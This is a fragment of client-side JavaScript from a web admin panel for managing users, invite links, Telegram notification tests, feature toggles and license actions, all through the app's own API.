  if (!(await confirmDialog('Revoke this invite? The link will no longer work.', { danger: true, confirmText: 'Revoke' }))) return;
  await fetch(BASE + '/api/tokens/' + tokenPrefix, { method: 'DELETE' });
  showToast('Invite revoked', 'success');
  loadUsers();
}

function toggleInviteRow(rowId) {
  const row = document.getElementById(rowId);
  if (!row) return;
  const open = row.style.display !== 'none';
  row.style.display = open ? 'none' : '';
  const chev = document.getElementById(rowId.replace('inv-', 'inv-chev-'));
  if (chev) chev.style.transform = open ? '' : 'rotate(90deg)';
  if (!open) {
    const inp = document.getElementById(rowId.replace('inv-', 'inv-link-'));
    if (inp) setTimeout(() => inp.select(), 50);
  }
}

function copyInviteRowLink(id) {
  const inp = document.getElementById('inv-link-' + id);
  if (!inp) return;
  copyText(inp.value);
  const msg = document.getElementById('inv-copy-' + id);
  if (msg) {
    msg.style.display = 'block';
    setTimeout(() => { msg.style.display = 'none'; }, 2000);
  }
}

async function submitEditForm() {
  const username = document.getElementById('uf-username').value.trim();
  const password = document.getElementById('uf-password').value;
  const displayName = document.getElementById('uf-displayName').value.trim();
  const role = document.getElementById('uf-role').value;
  const assignedEmails = document.getElementById('uf-emails').value.split('\n').map(e => e.trim()).filter(Boolean);
  const assignedDomains = document.getElementById('uf-domains').value.split('\n').map(d => d.trim()).filter(Boolean);
  const btn = document.getElementById('uf-submit');

  if (!username) { showFormMsg('Username is required.', 'red'); return; }
  if (password && password.length < 6) { showFormMsg('Password must be at least 6 characters.', 'red'); return; }

  btn.disabled = true; btn.textContent = 'Saving...';
  const body = { username, displayName: displayName || username, role, assignedEmails, assignedDomains };
  if (password) body.password = password;

  try {
    const resp = await fetch(`${BASE}/api/users/${editingUserId}`, { method: 'PUT', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
    const data = await resp.json();
    if (!resp.ok) { showFormMsg(data.error || 'Failed.', 'red'); btn.disabled = false; btn.textContent = 'Save Changes'; return; }
    hideUserForm();
    loadUsers();
  } catch {
    showFormMsg('Network error.', 'red');
    btn.disabled = false; btn.textContent = 'Save Changes';
  }
}

async function testTelegram() {
  const botToken = document.getElementById('uf-tg-token').value.trim();
  const chatId = document.getElementById('uf-tg-chatid').value.trim();
  const msgEl = document.getElementById('uf-tg-msg');
  const btn = document.getElementById('uf-tg-test');

  // If token field is empty but user has one configured, we need to get it from the user record
  if (!botToken && !chatId) {
    msgEl.textContent = 'Enter bot token and chat ID first.';
    msgEl.style.color = 'var(--red)';
    msgEl.style.display = 'block';
    setTimeout(() => { msgEl.style.display = 'none'; }, 3000);
    return;
  }
  if (!chatId) {
    msgEl.textContent = 'Chat ID is required.';
    msgEl.style.color = 'var(--red)';
    msgEl.style.display = 'block';
    setTimeout(() => { msgEl.style.display = 'none'; }, 3000);
    return;
  }

  btn.disabled = true;
  btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
  try {
    const resp = await fetch(BASE + '/api/test-telegram', {
      method: 'POST', headers: { 'Content-Type': J },
      body: JSON.stringify({ botToken, chatId }),
    });
    const data = await resp.json();
    if (data.ok) {
      msgEl.textContent = 'Test notification sent! Check your Telegram.';
      msgEl.style.color = 'var(--green)';
    } else {
      msgEl.textContent = data.error || 'Failed to send.';
      msgEl.style.color = 'var(--red)';
    }
  } catch {
    msgEl.textContent = 'Network error.';
    msgEl.style.color = 'var(--red)';
  }
  msgEl.style.display = 'block';
  btn.disabled = false;
  btn.innerHTML = '<i class="fab fa-telegram" style="margin-right:4px;"></i> Send Test Notification';
  setTimeout(() => { msgEl.style.display = 'none'; }, 5000);
}

function hideUserForm() {
  editingUserId = null;
  const c = document.getElementById('user-form-container');
  if (c) c.innerHTML = '';
}

function showFormMsg(text, color) {
  const el = document.getElementById('uf-msg');
  if (!el) return;
  el.style.display = 'inline';
  el.style.color = `var(--${color})`;
  el.textContent = text;
  setTimeout(() => { el.style.display = 'none'; }, 4000);
}

async function toggleUserFeature(userId, feature, enabled) {
  const body = {}; body[feature] = enabled;
  const resp = await fetch(`${BASE}/api/user-features/${userId}`, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
  if (resp.ok) showToast(`${feature} ${enabled ? 'enabled' : 'disabled'}`, 'success');
  else showToast('Failed', 'error');
}

async function toggleRequireDomain(userId, enabled) {
  const resp = await fetch(`${BASE}/api/user-require-domain/${userId}`, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify({ enabled }) });
  if (resp.ok) showToast(`Domain ${enabled ? 'required' : 'optional'}`, 'success');
  else showToast('Failed', 'error');
}

async function licenseAction(userId, action, opts) {
  const body = { action, ...opts };
  const resp = await fetch(`${BASE}/api/license/${userId}`, { method: 'POST', headers: { 'Content-Type': J }, body: JSON.stringify(body) });
  const data = await resp.json();
  if (resp.ok && data.ok) { showToast(`License: ${action} done`, 'success'); loadUsers(); }
  else showToast(data.error || 'Failed', 'error');
}

async function deleteUser(id, name) {
  if (!(await confirmDialog(`This cannot be undone.`, { title: `Delete user "${name}"?`, danger: true, confirmText: 'Delete' }))) return;
  const resp = await fetch(`${BASE}/api/users/${id}`, { method: 'DELETE' });
  const data = await resp.json();
  if (!resp.ok) { showToast(data.error || 'Failed to delete user.', 'error'); return; }
  showToast(`User "${name}" deleted`, 'success');
  loadUsers();
}

init();
</script>
